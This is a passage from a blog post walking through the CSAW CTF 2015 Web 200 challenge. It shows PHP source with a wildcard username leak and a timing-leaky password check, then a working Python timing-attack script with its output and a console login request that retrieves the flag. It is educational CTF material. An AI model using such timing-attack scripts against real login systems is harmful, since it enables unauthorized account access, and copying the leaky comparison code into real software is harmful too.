+</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;&lt;h1&gt;You must supply a username and password&lt;/h1&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><p>It looks like our flag is found in <code>flag.php</code>. Unfortunately, we don&rsquo;t have that file, but it looks like <code>$flag</code> is printed if we authenticate correctly.</p><p>The authentication is handled by the <code>validate(username, password)</code> function in <code>validate_pass.php</code>. Let&rsquo;s see what it looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=nx>snip</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$user</span> <span class=o>=</span> <span class=nx>mysql_real_escape_string</span><span class=p>(</span><span class=nv>$user</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$query</span> <span class=o>=</span> <span class=s2>&#34;SELECT hash FROM users WHERE username=&#39;</span><span class=si>$user</span><span class=s2>&#39;;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysql_query</span><span class=p>(</span><span class=nv>$query</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Query failed: &#39;</span> <span class=o>.</span> <span class=nx>mysql_error</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$line</span> <span class=o>=</span> <span class=nx>mysql_fetch_row</span><span class=p>(</span><span class=nv>$result</span><span class=p>,</span> <span class=nx>MYSQL_ASSOC</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$hash</span> <span class=o>=</span> <span class=nv>$line</span><span class=p>[</span><span class=s1>&#39;hash&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$pass</span><span class=p>)</span> <span class=o>!=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$hash</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>False</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>$index</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=nv>$hash</span><span class=p>[</span><span class=nv>$index</span><span class=p>]){</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$pass</span><span class=p>[</span><span class=nv>$index</span><span class=p>]</span> <span class=o>!=</span> <span class=nv>$hash</span><span class=p>[</span><span class=nv>$index</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=c1># Protect against brute force attacks
+</span></span></span><span class=line><span class=cl>        <span class=nx>usleep</span><span class=p>(</span><span class=mi>300000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$index</span><span class=o>+=</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=nx>snip</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><p>This function gets the password hash from the given username and then compares it character by character with the hash provided. Keep in mind, our password was hashed in Javascript in the snippet shown above.</p><p>We&rsquo;ll get back to the password comparison later. First, how do we get the username? We have one more file, <code>sign_up.php</code> that might help. Let&rsquo;s take a look:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=nx>snip</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$user</span> <span class=o>=</span> <span class=nx>mysql_real_escape_string</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// check to see if the username is available
+</span></span></span><span class=line><span class=cl>    <span class=nv>$query</span> <span class=o>=</span> <span class=s2>&#34;SELECT username FROM users WHERE username LIKE &#39;</span><span class=si>$user</span><span class=s2>&#39;;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysql_query</span><span class=p>(</span><span class=nv>$query</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Query failed: &#39;</span> <span class=o>.</span> <span class=nx>mysql_error</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$line</span> <span class=o>=</span> <span class=nx>mysql_fetch_row</span><span class=p>(</span><span class=nv>$result</span><span class=p>,</span> <span class=nx>MYSQL_ASSOC</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$line</span> <span class=o>==</span> <span class=k>NULL</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=c1>// Signing up for premium is still in development
+</span></span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;&lt;h2 style=&#34;margin: 60px;&#34;&gt;Lawn Care Simulator 2015 is currently in a private beta. Please check back later&lt;/h2&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;&lt;h2 style=&#34;margin: 60px;&#34;&gt;Username: &#39;</span> <span class=o>.</span> <span class=nv>$line</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34; is not available&lt;/h2&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=nx>snip</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><p>This function tries to look up the username given and, if it exists, will tell us the username isn&rsquo;t available. We could try guessing (I did), but that doesn&rsquo;t help. Let&rsquo;s look more closely at the code.</p><p>The SQL statement is done via a <code>LIKE</code> condition. This allows us to use the <code>%</code> character as a wildcard. So, by trying the username <code>%</code>, we should get the username from the database.</p><img src=/blog/images/blog/csaw2015/username.png><p>Awesome - our username is <code>~~FLAG~~</code>. Now we need to find the password.</p><p>Going back to the code given in <code>validate_pass.php</code>, we see the following comparison</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=nv>$hash</span><span class=p>[</span><span class=nv>$index</span><span class=p>]){</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$pass</span><span class=p>[</span><span class=nv>$index</span><span class=p>]</span> <span class=o>!=</span> <span class=nv>$hash</span><span class=p>[</span><span class=nv>$index</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=c1># Protect against brute force attacks
+</span></span></span><span class=line><span class=cl>        <span class=nx>usleep</span><span class=p>(</span><span class=mi>300000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$index</span><span class=o>+=</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span></code></pre></div><p>This snippet checks our hash against the one pulled from the databse. It does this by checking each character. If the character is wrong, it returns false immediately. However, look at what happens if the character is right. It does a <code>usleep(300000)</code>, which is .3 seconds. This means that, if we check every character, one will take longer. This is a <strong>timing attack</strong>.</p><p>I wrote a quick script to exploit this. Here is the final (not very good) code I wound up using:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>import time
+</span></span><span class=line><span class=cl>import requests
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>data = {
+</span></span><span class=line><span class=cl>	&#34;username&#34; : &#34;~~FLAG~~&#34;,
+</span></span><span class=line><span class=cl>	&#34;password&#34; : &#34;&#34;
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>url = &#34;http://54.175.3.248:8089/premium.php&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>password = [&#39;a&#39;]*32 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def send_request(password):
+</span></span><span class=line><span class=cl>	data[&#34;password&#34;] = password
+</span></span><span class=line><span class=cl>	start = time.time()
+</span></span><span class=line><span class=cl>	requests.post(url, data=data)
+</span></span><span class=line><span class=cl>	end = time.time()
+</span></span><span class=line><span class=cl>	return end - start	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>hex = &#34;0123456789abcdef&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>for i in range(32):
+</span></span><span class=line><span class=cl>	max_time = 0
+</span></span><span class=line><span class=cl>	char = &#34;&#34;
+</span></span><span class=line><span class=cl>	index = 0
+</span></span><span class=line><span class=cl>	for j in hex:
+</span></span><span class=line><span class=cl>		temp_pass = password
+</span></span><span class=line><span class=cl>		temp_pass[i] = j
+</span></span><span class=line><span class=cl>		request_time = send_request(&#34;&#34;.join(temp_pass))
+</span></span><span class=line><span class=cl>		if request_time &gt;= max_time:
+</span></span><span class=line><span class=cl>			index = i
+</span></span><span class=line><span class=cl>			max_time = request_time
+</span></span><span class=line><span class=cl>			char = j
+</span></span><span class=line><span class=cl>	password[index] = char	
+</span></span><span class=line><span class=cl>	print &#34;&#34;.join(password)
+</span></span></code></pre></div><p>This basically brute forces the password by checking each valid hex character to see which takes the longest amount of time. It does this for each character in the hash. Running the code produces the following output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>6aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>66aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667eaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e2aaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e21aaaaaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217aaaaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e2176aaaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e21766aaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666aaaaaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666aaaaaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a1aaaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13aaaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13daaaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d3aaaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39aaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39aaaaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39a0aaaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39a02aaaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39a023aaaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39a0239aaaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39a02399aaaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39a023995aaaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39a0239951aaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39a0239951eaaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39a0239951efaaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39a0239951efeaaaaa
+</span></span><span class=line><span class=cl>667e217666a13d39a0239951efe2aaaa
+</span></span><span class=line><span class=cl>667e217666a13d39a0239951efe2daaa
+</span></span><span class=line><span class=cl>667e217666a13d39a0239951efe2deaa
+</span></span><span class=line><span class=cl>667e217666a13d39a0239951efe2de4a
+</span></span><span class=line><span class=cl>667e217666a13d39a0239951efe2de48
+</span></span></code></pre></div><p>Now, all that&rsquo;s left is to login and get the flag. To bypass the javascript hashing, I just used the dev console (you could also do this in Python!):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$.post(&#39;premium.php&#39;, {&#34;username&#34;: &#34;~~FLAG~~&#34;, &#34;password&#34; : &#34;667e217666a13d39a0239951efe2de48&#34;}).success(function(data){console.log(data)})
+</span></span><span class=line><span class=cl>&lt;head&gt;
+</span></span><span class=line><span class=cl>    &lt;title&gt;Lawn Care Simulator 2015&lt;/title&gt;
+</span></span><span class=line><span class=cl>    &lt;script src=&#34;//code.jquery.com/jquery-1.11.3.min.js&#34;&gt;&lt;/script&gt;
+</span></span><span class=line><span class=cl>    &lt;script src=&#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js&#34;&gt;&lt;/script&gt; 
+</span></span><span class=line><span class=cl>    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css&#34;&gt;
+</span></span><span class=line><span class=cl>&lt;/head&gt;
+</span></span><span class=line><span class=cl>&lt;body&gt;
+</span></span><span class=line><span class=cl>&lt;h1&gt;flag{gr0wth__h4ck!nG!1!1!&lt;/h1&gt;&lt;/body&gt;
+</span></span><span class=line><span class=cl>&lt;/html&gt;
+</span></span></code></pre></div><p>And there we have the flag: <code>flag{gr0wth__h4ck!nG!1!1!}</code></p><p>-Jordan (<a href=https://twitter.com/jw_sec>@jw_sec</a>)</p></section><footer class=post-footer><figure class=author-image><a class=img href=https://jordan-wright.com/blog/ style=background-image:url(https://jordan-wright.com/blog/images/jordan-profile.jpg)><span class=hidden>Jordan Wright's Picture</span></a></figure><section class=author><h4><a href=https://jordan-wright.com/blog/>Jordan Wright</a></h4><p>Security Researcher, Open-Source Developer.</p><div class=author-meta><span class="author-location icon-location">Texas</span></div></section><section class=share><h4>Share this post</h4><a class=share-link href="https://twitter.com/intent/tweet?text=CSAW%20CTF%202015%20-%20Web%20200%20Writeup&nbsp;-&nbsp;Jordan%20Wright&amp;url=https%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f09%2f21%2fcsaw-ctf-2015-web-200-writeup%2f" onclick='return window.open(this.href,"x-share","width=550,height=235"),!1'><svg class="share-icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M18.244 2.25h3.308l-7.227 8.26 8.503 11.24h-6.68l-5.23-6.84-6.02 6.84H1.59l7.73-8.812L1.16 2.25h6.85l4.73 6.25 5.504-6.25zm-1.16 17.52h1.833L6.71 4.126H4.745L17.084 19.77z"/></svg>
+<span class=hidden>X</span>
+</a><a class=share-link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f09%2f21%2fcsaw-ctf-2015-web-200-writeup%2f&amp;t=CSAW%20CTF%202015%20-%20Web%20200%20Writeup" onclick='return window.open(this.href,"hn-share","width=600,height=400"),!1'><svg class="share-icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill-rule="evenodd" d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+<span class=hidden>Hacker News</span>
+</a><a class=share-link href="https://www.linkedin.com/sharing/share-offsite/?url=https%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f09%2f21%2fcsaw-ctf-2015-web-200-writeup%2f" onclick='return window.open(this.href,"linkedin-share","width=600,height=500"),!1'><svg class="share-icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853.0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.6.0 4.264 2.37 4.264 5.455v6.286zM5.337 7.433a2.062 2.062.0 110-4.123 2.062 2.062.0 010 4.123zM6.814 20.452H3.861V9h2.953v11.452zM22.225.0H1.771C.792.0.0.774.0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2.0 22.222.0z"/></svg>
+<span class=hidden>LinkedIn</span></a></section></footer></article></main></div><script type=text/javascript src=https://jordan-wright.com/blog/js/jquery.js></script><script type=text/javascript src=https://jordan-wright.com/blog/js/index.js></script></body></html>
